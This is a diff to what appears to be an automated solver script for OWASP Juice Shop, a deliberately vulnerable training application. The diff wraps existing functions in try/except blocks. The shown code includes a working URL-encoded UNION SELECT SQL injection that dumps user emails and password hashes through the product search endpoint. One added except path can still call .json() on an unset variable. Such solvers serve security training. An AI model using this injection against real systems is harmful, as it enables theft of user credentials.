@@ -12,9 +12,12 @@ def get_users(server, session):
     :param session: Session
     :return: list of user objects
     """
-    users = session.get('{}/rest/user/authentication-details/'.format(server))
-    if not users.ok:
-        print('Error retrieving user info. Request status: {}'.format(users.status_code))
+    try:
+      users = session.get('{}/rest/user/authentication-details/'.format(server))
+      if not users.ok:
+          print('Error retrieving user info. Request status: {}'.format(users.status_code))
+    except:
+      print('Failed!')
     return users.json().get('data')
 
 
@@ -24,16 +27,19 @@ def get_users_with_sql_injection(server):
     Also solves logging in as admin with real credentials if unsolved yet.
     :param server: juice shop URL
     """
-    session = get_admin_session(server)
-    #injection = "test')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM USERS--"
-    injection = "test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--"
-    users = session.get('{}/rest/products/search?q={}'.format(server, injection))
-    if not users.ok:
-        print('Error with SQLi attempt.')
-    print('Found email and password hashes with SQLi, printing...')
-    for user in users.json().get('data'):
-        print('Email: {}, Password hash: {}'.format(user.get('name'), user.get('description')))
-    print('Done.')
+    try:
+      session = get_admin_session(server)
+      #injection = "test')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM USERS--"
+      injection = "test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--"
+      users = session.get('{}/rest/products/search?q={}'.format(server, injection))
+      if not users.ok:
+          print('Error with SQLi attempt.')
+      print('Found email and password hashes with SQLi, printing...')
+      for user in users.json().get('data'):
+          print('Email: {}, Password hash: {}'.format(user.get('name'), user.get('description')))
+      print('Done.')
+    except:
+      print('Failed!')
 
 
 def change_bender_password(server):
